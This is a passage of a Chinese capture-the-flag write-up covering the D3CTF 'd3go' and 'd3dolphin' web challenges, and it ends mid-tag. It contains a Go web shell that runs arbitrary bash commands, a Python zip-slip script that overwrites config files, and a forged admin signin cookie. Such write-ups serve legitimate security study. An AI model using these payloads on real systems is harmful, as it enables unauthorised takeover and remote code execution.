class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auth.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">User</span><br><span class="line">Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ok, err := db.CheckAuth(u)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line"><span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> upload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/utils&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipPath <span class="type">string</span>, outputPath <span class="type">string</span>)</span></span> (*utils.Tree, <span class="type">error</span>) &#123;</span><br><span class="line">r, err := zip.OpenReader(zipPath)</span><br><span class="line"><span class="keyword">defer</span> r.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(outputPath, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tree := utils.NewTree(filepath.Base(outputPath))</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">utils.Paths2Tree(f.Name, path.Join(outputPath, f.Name), tree)</span><br><span class="line">p, _ := filepath.Abs(filepath.Join(outputPath, f.Name))</span><br><span class="line">content, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data, err := io.ReadAll(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(filepath.Dir(p), <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.WriteFile(p, data, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">content.Close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tree, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微审一下题，首先在main.go有这么一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段对静态文件做了些处理，他直接就没对../进行处理，导致我们可以任意目录穿越，也就是一开始我们任意文件读取，读取完后再注意一下controller里的这一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对应的user.go如上，是一个struct，但是里面有一个字段需要注意</p><p><img src="../images/image-20230507162913703.png" alt="image-20230507162913703"></p><p>给了 gorm.model 就说明自带deletedat字段，也就是有软删除这么一说，软删除也就是非实际删除数据库数据，而是单纯无法查询出来。结合一下上面的源码，我们的目的是以admin登录然后去上传zip文件，因此我们应该软链接先删除一下admin：</p><p>这里的话admin是数据库中的第一个用户</p><p><img src="../images/image-20230507164038666.png" alt="image-20230507164038666"></p><p><img src="../images/image-20230507164030525.png" alt="image-20230507164030525"></p><p>然后再创建一个用户</p><p><img src="../images/image-20230507164129892.png" alt="image-20230507164129892"></p><p>之后登录test就是管理员了，因为代码里的逻辑是ID为1的用户就是管理员，那么接下来就好说了，由题目中config.go和main.go可以得知实现了热部署</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就好说了，我们可以覆盖config.yaml实现自更新，以下是chatgpt问答</p><p><a href="https://boogipop.com/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/#d3go">参考boogipop师傅的</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这就是恶意的go文件，把他编译为二进制文件后，还需要准备一个yaml文件</p><p>下面这个是原本的config.yaml文件</p><p><img src="../images/image-20230507164810114.png" alt="image-20230507164810114"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  noAdminLogin: <span class="literal">true</span></span><br><span class="line">database:</span><br><span class="line">  user: root</span><br><span class="line">  password: root</span><br><span class="line">  host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  port: <span class="number">3306</span></span><br><span class="line">update:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br><span class="line">  url: http:<span class="comment">//127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  interval: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后利用zipslip去覆盖文件，因为题目并没有对unzip做处理，所以可以进行任意文件覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##生成的zip文件</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;E:\\CTFLearning\\d3ctf\\d3go\\trueexp\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>然后将生成的文件上传到服务器上就可以成功rce了</p><h2 id="d3dolphin"><a href="#d3dolphin" class="headerlink" title="d3dolphin"></a>d3dolphin</h2><p><strong>提示：</strong></p><p><strong>没有必要蛮力。管理员自从他写日志后就再也没有出现过。</strong></p><p><strong>管理员通过简单地按照 <a href="https://github.com/ssteveez/dolphin/blob/main/README.md">https://github.com/ssteveez/dolphin/blob/main/README.md</a> 所说的内容来修补错误</strong></p><p>题目</p><p><img src="../images/image-20230505201032755.png" alt="image-20230505201032755"></p><p><img src="../images/image-20230505201049807.png" alt="image-20230505201049807"></p><p>给了个CVE   然后告诉你这里使用了补丁来修复这个CVE</p><p>signin_token 可以很容易地通过提供⽤⼾名、id 和⽤⼾ [last_login_time] 来暴⼒破解</p><p><strong>因为admin的用户密码不知道，于是就去下载源码来进行查看</strong></p><p><img src="../images/image-20230505211453158.png" alt="image-20230505211453158"></p><p>发现代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;is_signin&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断是否登录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_signin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">            <span class="comment">// 判断是否记住登录</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?uid&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?signin_token&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$UserModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$UserModel</span>::<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;uid&#x27;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="variable">$signin_token</span> = <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;last_login_time&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;signin_token&#x27;</span>) == <span class="variable">$signin_token</span>) &#123;</span><br><span class="line">                        <span class="comment">// 自动登录</span></span><br><span class="line">                        <span class="variable">$UserModel</span>-&gt;<span class="title function_ invoke__">autoLogin</span>(<span class="variable">$user</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth_sign&#x27;</span>) == <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>) ? <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据log.txt，admin的last_login_time是2011-04-05 14:19:19，这样我们就可以⽣成⼀个signing_token：</p><p>这里需要的是时间戳  所以<strong>2011-04-05 14:19:19</strong>的时间戳为1301984359</p><p><img src="../images/image-20230505211707879.png" alt="image-20230505211707879"></p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;data_auth_sign&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据签名认证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data 被认证的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">data_auth_sign</span>(<span class="params"><span class="variable">$data</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据类型检测</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$data</span> = (<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 排序</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// url编码并生成query字符串</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// 生成签名</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以进行签名的伪造了</p><p><img src="../images/image-20230505214149350.png" alt="image-20230505214149350"></p><p>这里为了避免id和时间戳的混淆，于是这里就可以使用分+号来进行分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;0=admin1&quot;</span> . <span class="string">&quot;1301984359&quot;</span>;  <span class="comment">// 要计算 SHA-1 哈希的字符串</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$s</span>);  <span class="comment">// 计算 SHA-1 哈希值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$h</span>;  <span class="comment">// 输出：ab5f486a24426d9158c99507da45ae3bac476dd6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成cookie后，就可以进行伪造登录了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505214607572.png" alt="image-20230505214607572"></p><p>因为这里存在通配符，于是名字就可以这样取</p><p><img src="../images/image-20230505214838155.png" alt="image-20230505214838155"></p><p>添加cookie后就可以成功进行登录了</p><p>这里的版本是v1.5.1，于是可以去查看上一个版本的漏洞，看这个版本修复了啥，然后在通过看官方的修复有没有漏洞，我们可不可以进行绕过</p><p>根据<a 